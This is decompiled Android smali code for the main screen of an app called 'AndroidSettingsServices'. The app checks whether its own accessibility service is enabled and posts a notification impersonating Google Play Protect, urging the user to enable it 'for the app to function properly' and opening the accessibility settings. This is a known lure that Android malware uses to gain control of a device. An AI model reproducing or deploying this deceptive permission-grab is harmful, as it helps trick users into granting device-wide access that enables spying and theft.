.class public Lcom/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "AndroidSettingsServices"


# instance fields
.field private gifDrawable:Lpl/droidsonroids/gif/GifDrawable;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 20
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lcom/MainActivity;)Z
    .locals 1
    .param p0, "x0"    # Lcom/MainActivity;

    .line 20
    invoke-direct {p0}, Lcom/MainActivity;->isAccessibilityServiceEnabled()Z

    move-result v0

    return v0
.end method

.method private createNotificationChannel(Landroid/app/NotificationManager;)V
    .locals 5
    .param p1, "notificationManager"    # Landroid/app/NotificationManager;

    .line 88
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 89
    const-string v0, "GooglePlayProtectChannel"

    .line 90
    .local v0, "name":Ljava/lang/CharSequence;
    const-string v1, "Channel for Google Play Protect Channel notifications"

    .line 91
    .local v1, "description":Ljava/lang/String;
    const/4 v2, 0x3

    .line 92
    .local v2, "importance":I
    new-instance v3, Landroid/app/NotificationChannel;

    const-string v4, "AndroidSettingsServices"

    invoke-direct {v3, v4, v0, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 93
    .local v3, "channel":Landroid/app/NotificationChannel;
    invoke-virtual {v3, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 94
    invoke-virtual {p1, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 96
    .end local v0    # "name":Ljava/lang/CharSequence;
    .end local v1    # "description":Ljava/lang/String;
    .end local v2    # "importance":I
    .end local v3    # "channel":Landroid/app/NotificationChannel;
    :cond_0
    return-void
.end method

.method private isAccessibilityServiceEnabled()Z
    .locals 4

    .line 113
    const/4 v0, 0x0

    .line 114
    .local v0, "accessibilityEnabled":I
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/com.MyAccessibilityService"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 116
    .local v1, "service":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p0}, Lcom/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "accessibility_enabled"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;)I

    move-result v2
    :try_end_0
    .catch Landroid/provider/Settings$SettingNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move v0, v2

    .line 119
    goto :goto_0

    .line 117
    :catch_0
    move-exception v2

    .line 120
    :goto_0
    const/4 v2, 0x1

    if-ne v0, v2, :cond_1

    invoke-direct {p0, v1}, Lcom/MainActivity;->isAccessibilityServiceEnabledForPackage(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    goto :goto_1

    :cond_0
    const/4 v2, 0x0

    :cond_1
    :goto_1
    return v2
.end method

.method private isAccessibilityServiceEnabledForPackage(Ljava/lang/String;)Z
    .locals 3
    .param p1, "service"    # Ljava/lang/String;

    .line 124
    new-instance v0, Landroid/text/TextUtils$SimpleStringSplitter;

    const/16 v1, 0x3a

    invoke-direct {v0, v1}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    .line 125
    .local v0, "splitter":Landroid/text/TextUtils$SimpleStringSplitter;
    invoke-virtual {p0}, Lcom/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "enabled_accessibility_services"

    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 126
    .local v1, "settingValue":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 127
    invoke-virtual {v0, v1}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    .line 128
    :cond_0
    invoke-virtual {v0}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 129
    invoke-virtual {v0}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 130
    const/4 v2, 0x1

    return v2

    .line 134
    :cond_1
    const/4 v2, 0x0

    return v2
.end method

.method private showAccessibilityNotification()V
    .locals 6

    .line 68
    invoke-direct {p0}, Lcom/MainActivity;->isAccessibilityServiceEnabled()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 69
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    .line 70
    .local v0, "notificationManager":Landroid/app/NotificationManager;
    invoke-direct {p0, v0}, Lcom/MainActivity;->createNotificationChannel(Landroid/app/NotificationManager;)V

    .line 72
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 73
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v2, 0x4000000

    const/4 v3, 0x0

    invoke-static {p0, v3, v1, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 75
    .local v2, "pendingIntent":Landroid/app/PendingIntent;
    new-instance v4, Landroidx/core/app/NotificationCompat$Builder;

    const-string v5, "AndroidSettingsServices"

    invoke-direct {v4, p0, v5}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    sget v5, Lcom/AndroidSettingsServices/R$drawable;->ic_launcher:I

    .line 76
    invoke-virtual {v4, v5}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v4

    .line 77
    const-string v5, "Enable Google Play Protect Service\'s"

    invoke-virtual {v4, v5}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v4

    .line 78
    const-string v5, "Please enable Google Play Protect Service\'s for the app to function properly."

    invoke-virtual {v4, v5}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v4

    .line 79
    invoke-virtual {v4, v3}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v3

    .line 80
    invoke-virtual {v3, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v3

    .line 81
    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v3

    .line 83
    .local v3, "builder":Landroidx/core/app/NotificationCompat$Builder;
    invoke-virtual {v3}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 85
    .end local v0    # "notificationManager":Landroid/app/NotificationManager;
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "pendingIntent":Landroid/app/PendingIntent;
    .end local v3    # "builder":Landroidx/core/app/NotificationCompat$Builder;
    :cond_0
    return-void
.end method

.method private showToastPeriodically()V
    .locals 2

    .line 99
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    .line 100
    .local v0, "handler":Landroid/os/Handler;
    new-instance v1, Lcom/MainActivity$1;

    invoke-direct {v1, p0, v0}, Lcom/MainActivity$1;-><init>(Lcom/MainActivity;Landroid/os/Handler;)V

    .line 109
    .local v1, "runnable":Ljava/lang/Runnable;
    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 110
    return-void
.end method


# virtual methods
.method synthetic lambda$onCreate$0$com-MainActivity()V
    .locals 2

    .line 50
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    if-eqz v0, :cond_0

    .line 51
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lpl/droidsonroids/gif/GifDrawable;->seekToFrame(I)V

    .line 52
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {v0}, Lpl/droidsonroids/gif/GifDrawable;->stop()V

    .line 54
    :cond_0
    return-void
.end method

.method synthetic lambda$onCreate$1$com-MainActivity(Landroid/view/View;)V
    .locals 4
    .param p1, "v"    # Landroid/view/View;

    .line 44
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {v0}, Lpl/droidsonroids/gif/GifDrawable;->isPlaying()Z

    move-result v0

    if-nez v0, :cond_0

    .line 45
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lpl/droidsonroids/gif/GifDrawable;->setLoopCount(I)V

    .line 46
    iget-object v0, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {v0}, Lpl/droidsonroids/gif/GifDrawable;->start()V

    .line 49
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/MainActivity$$ExternalSyntheticLambda0;-><init>(Lcom/MainActivity;)V

    iget-object v2, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    .line 54
    invoke-virtual {v2}, Lpl/droidsonroids/gif/GifDrawable;->getDuration()I

    move-result v2

    int-to-long v2, v2

    .line 49
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 56
    :cond_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 28
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 29
    sget v0, Lcom/AndroidSettingsServices/R$layout;->layout:I

    invoke-virtual {p0, v0}, Lcom/MainActivity;->setContentView(I)V

    .line 31
    sget v0, Lcom/AndroidSettingsServices/R$id;->gifImageView:I

    invoke-virtual {p0, v0}, Lcom/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Lpl/droidsonroids/gif/GifImageView;

    .line 35
    .local v0, "gifImageView":Lpl/droidsonroids/gif/GifImageView;
    :try_start_0
    new-instance v1, Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {p0}, Lcom/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    sget v3, Lcom/AndroidSettingsServices/R$drawable;->all_good:I

    invoke-direct {v1, v2, v3}, Lpl/droidsonroids/gif/GifDrawable;-><init>(Landroid/content/res/Resources;I)V

    iput-object v1, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    .line 36
    iget-object v1, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {v1}, Lpl/droidsonroids/gif/GifDrawable;->stop()V

    .line 37
    iget-object v1, p0, Lcom/MainActivity;->gifDrawable:Lpl/droidsonroids/gif/GifDrawable;

    invoke-virtual {v0, v1}, Lpl/droidsonroids/gif/GifImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 40
    goto :goto_0

    .line 38
    :catch_0
    move-exception v1

    .line 39
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 43
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    new-instance v1, Lcom/MainActivity$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lcom/MainActivity$$ExternalSyntheticLambda1;-><init>(Lcom/MainActivity;)V

    invoke-virtual {v0, v1}, Lpl/droidsonroids/gif/GifImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 60
    invoke-direct {p0}, Lcom/MainActivity;->showAccessibilityNotification()V

    .line 63
    invoke-direct {p0}, Lcom/MainActivity;->showToastPeriodically()V

    .line 64
    invoke-static {p0}, Lcom/Alert;->openSettings(Landroid/content/Context;)V

    .line 65
    return-void
.end method
